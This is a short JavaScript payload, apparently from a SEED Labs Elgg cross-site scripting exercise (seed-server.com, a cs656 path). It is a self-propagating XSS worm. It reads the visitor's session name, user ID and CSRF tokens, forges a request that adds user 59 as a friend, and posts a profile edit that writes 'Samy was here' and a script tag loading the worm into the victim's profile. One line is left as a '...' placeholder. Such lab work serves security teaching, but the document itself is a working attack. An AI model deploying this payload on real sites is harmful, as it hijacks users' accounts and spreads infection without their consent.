<script type="text/javascript">
window.onload = function() {
 var headerTag = "<script type=\"text/javascript\" src=\"/home/cs656/xss_worm.js\">";
 var jsCode = ...;
 var tailTag = "</" + "script>";
 
 var wormCode = encodeURIComponent(headerTag + tailTag);

 var userName="&name="+elgg.session.user.name;
 var guid="&guid="+elgg.session.user.guid;
 var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
 var token="&__elgg_token="+elgg.security.token.__elgg_token;
 var description="description=Samy was here"+wormCode;
 
 
 
 var content=description+userName+guid+ts+token;
 var samyGuid=59;
 var sendurl="http://www.seed-server.com/action/profile/edit";
 
 var friendurl="http://www.seed-server.com/action/friends/add?friend=59"+ts+token+ts+token;
 
 var Ajax1=null
 Ajax1=new XMLHttpRequest();
 Ajax1.open("GET", friendurl, true);
 Ajax1.send();
 
 if(elgg.session.user.guid!=samyGuid)
 {
  var Ajax=null;
  Ajax=new XMLHttpRequest();
  Ajax.open("POST", sendurl, true);
  Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  Ajax.send(content);
 }
}
</script>
